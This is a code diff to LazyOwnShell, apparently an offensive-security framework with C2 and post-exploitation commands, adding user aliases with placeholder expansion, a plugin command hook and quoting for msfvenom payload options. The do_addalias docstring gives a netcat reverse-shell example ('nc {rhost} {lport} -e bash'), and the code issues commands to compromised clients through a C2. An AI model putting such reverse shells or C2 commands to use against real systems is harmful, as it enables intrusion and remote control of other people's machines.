@@ -20,7 +20,8 @@ Description: This file contains the definition of the logic in the LazyOwnShell 
 """
 
 import cmd2
-from cmd2 import CommandSet, with_argparser, with_category
+
+from cmd2 import CommandSet, with_argparser, with_category, with_argument_list
 from utils import *
 
 with open('payload.json', 'r') as file:
@@ -363,7 +364,8 @@ class LazyOwnShell(cmd2.Cmd):
             "lazyssh77enum",
             "lazywerkzeugdebug",
         ]
-
+        user_aliases = load_user_aliases()
+        self.aliases.update(user_aliases)
 
     def log_command(self, cmd_name, cmd_args):
         """
@@ -466,7 +468,75 @@ class LazyOwnShell(cmd2.Cmd):
                     self.output = f"{cmd_name} {command} {file.read()}"
         self.logcsv(f"{cmd_name} {command}")
         return
+    
+    def onecmd_plus_hooks(self, statement, add_to_history=True, raise_keyboard_interrupt=True, orig_rl_history_length=None):
+        """
+        Intercepta comandos para expandir placeholders en aliases.
+        Maneja tanto strings como objetos Statement.
+        """
+        import cmd2
 
+        # Si es un string, convertirlo temporalmente o procesarlo con cuidado
+        if isinstance(statement, str):
+            raw_input = statement.strip()
+            if not raw_input or raw_input.startswith('#'):
+                return super().onecmd_plus_hooks(statement, add_to_history=add_to_history,
+                                            raise_keyboard_interrupt=raise_keyboard_interrupt)
+
+            # Extraer el nombre del comando (primera palabra)
+            cmd_name = raw_input.split()[0]
+        else:
+            # Es un objeto Statement
+            cmd_name = statement.command
+            raw_input = statement.raw
+
+        # Verificar si es un alias
+        if cmd_name in self.aliases:
+            raw_command = self.aliases[cmd_name]
+
+            # Contexto para reemplazar placeholders
+            context = {
+                **self.params,
+                'version': self.version,
+                'c2_url': getattr(self, 'c2_url', ''),
+                'sessions_dir': getattr(self, 'sessions_dir', ''),
+                'captured_images_dir': getattr(self, 'captured_images_dir', ''),
+                'path': getattr(self, 'path', ''),
+                'url_download': getattr(self, 'url_download', ''),
+                'c2_user': self.params.get('c2_user', ''),
+                'c2_pass': self.params.get('c2_pass', ''),
+                'start_user': self.params.get('start_user', ''),
+                'start_pass': self.params.get('start_pass', ''),
+                # Añade más según necesites
+            }
+
+            try:
+                expanded_command = raw_command.format(**context)
+            except KeyError as e:
+                self.perror(f"[!] Placeholder desconocido en alias '{cmd_name}': {e}")
+                return True
+            except Exception as e:
+                self.perror(f"[!] Error al expandir alias '{cmd_name}': {e}")
+                return True
+
+            # Ahora, si `statement` es un string → devolvemos el comando expandido como string
+            if isinstance(statement, str):
+                # Llamar al original con el string expandido
+                return super().onecmd_plus_hooks(expanded_command, add_to_history=add_to_history,
+                                            raise_keyboard_interrupt=raise_keyboard_interrupt)
+
+            # Si es un Statement, modificamos sus campos
+            else:
+                statement.raw = expanded_command
+                statement.command = expanded_command.split()[0]
+                statement.args = ' '.join(expanded_command.split()[1:])
+                return super().onecmd_plus_hooks(statement, add_to_history=add_to_history,
+                                            raise_keyboard_interrupt=raise_keyboard_interrupt)
+
+        # Si no es un alias, continuar normalmente
+        return super().onecmd_plus_hooks(statement, add_to_history=add_to_history,
+                                    raise_keyboard_interrupt=raise_keyboard_interrupt)
+        
     def one_cmd(self, command):
         """
         Internal function to execute commands.
@@ -752,6 +822,10 @@ class LazyOwnShell(cmd2.Cmd):
                         cmd_downloadcmd = f"download_c2 {downloadcmd}"
                         self.display_toastr(f"Remote Upload executing: {cmd_downloadcmd}", type='info')
                         self.onecmd(cmd_downloadcmd)
+                    if 'lazycommand' in tool:
+                        lazycommand = replace_command_placeholders(tool['lazycommand'], self.params)
+                        self.display_toastr(f"Lazy Command executing: {lazycommand}", type='info')
+                        self.onecmd(lazycommand)                        
 
                 except KeyError as e:
                     self.display_toastr(f"Error: Missing parameter '{e}' in the plugin configuration.", type='error')
@@ -24150,7 +24224,7 @@ class LazyOwnShell(cmd2.Cmd):
         if clientid == "":
             clientid = input(f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
         path = os.getcwd()
-        sessions = f"{path}/sessions/uploads"
+        sessions = f"{path}/sessions/temp_uploads"
         file_name = os.path.basename(file_name)
         output = f"{sessions}/{file_name}"
         command = f"upload:{file_name}"
@@ -24263,7 +24337,7 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(post_exploitation_category)
     def do_issue_command_to_c2(self, line):
         """
-        Exec command in the client using the C2.
+        Exec command in the client using the C2. download: command you must put the file in sessions/temp_upload or use download_c2 command
 
         Parameters:
         command (str): client_id [optional], Command to exec.
@@ -27128,17 +27202,17 @@ class LazyOwnShell(cmd2.Cmd):
             if os_key == "win":
                 if args.arch == "x86":
                     payload = "windows/exec"
-                    cmd_opt = f"CMD={args.command}"
+                    cmd_opt = f"CMD='{args.command}'"
                 else:
                     payload = "windows/x64/exec"
-                    cmd_opt = f"CMD={args.command}"
+                    cmd_opt = f"CMD='{args.command}'"
             else:  # linux
                 payload = "cmd/unix/reverse_bash" if "reverse" in args.command else "cmd/unix/generic"
                 if "reverse" in args.command:
                     # Assume it's a reverse shell command
                     cmd_opt = ""
                 else:
-                    cmd_opt = f"CMD={args.command}"
+                    cmd_opt = f"CMD='{args.command}'"
 
             # Build msfvenom command
             if os_key == "win" and "exec" in payload:
@@ -27205,6 +27279,65 @@ class LazyOwnShell(cmd2.Cmd):
         cmd = f"""tmux popup -w 80% -h 60% -x C -y C -E 'bash -c \"{line} ; sleep 3\"'"""
         self.cmd(cmd)
         return
+    
+    @with_argument_list
+    def do_addalias(self, arglist):
+        """
+        Add a new alias with support for placeholders like {rhost}, {lhost}, {lport}, etc.
+
+        Usage:
+            addalias <name> <command>
+
+        Example:
+            addalias myrev sh rlwrap nc {rhost} {lport} -e bash
+            addalias scan run_script "lazyscripts/nmap_scan.ls {rhost}"
+        """
+        if len(arglist) < 2:
+            self.display_toastr("Usage: addalias <name> <command>", type="error")
+            return
+
+        name = arglist[0]
+        command = ' '.join(arglist[1:])
+
+        # Validate name
+        if not name.isidentifier():
+            self.display_toastr(f"[!] Invalid alias name: '{name}'. Must be a valid identifier (no spaces, no special chars except _).", type="error")
+            return
+
+        if hasattr(self, f"do_{name}"):
+            self.display_toastr(f"[!] '{name}' is a built-in command and cannot be used as an alias.", type="error")
+            return
+
+        # Add to runtime aliases
+        self.aliases[name] = command
+
+        # Save to JSON file
+        try:
+            # Reload current aliases from file to avoid overwriting
+            if os.path.exists(USER_ALIASES_FILE):
+                with open(USER_ALIASES_FILE, 'r') as f:
+                    user_aliases = json.load(f)
+            else:
+                user_aliases = {}
+
+            user_aliases[name] = command
+            with open(USER_ALIASES_FILE, 'w') as f:
+                json.dump(user_aliases, f, indent=2)
+
+            self.display_toastr(f"[+] Alias '{name}' added and saved to {USER_ALIASES_FILE}")
+
+        except Exception as e:
+            self.display_toastr(f"[!] Failed to save alias: {e}", type="error")
+
+    def do_listaliases(self, _):
+        """List all available aliases."""
+        if not self.aliases:
+            self.display_toastr("[*] No aliases defined.")
+            return
+
+        self.display_toastr("🔐 Custom and built-in aliases:")
+        for name, cmd in sorted(self.aliases.items()):
+            print_msg(f"  {name:20} → {cmd}")
 
 def main():
     p = LazyOwnShell()
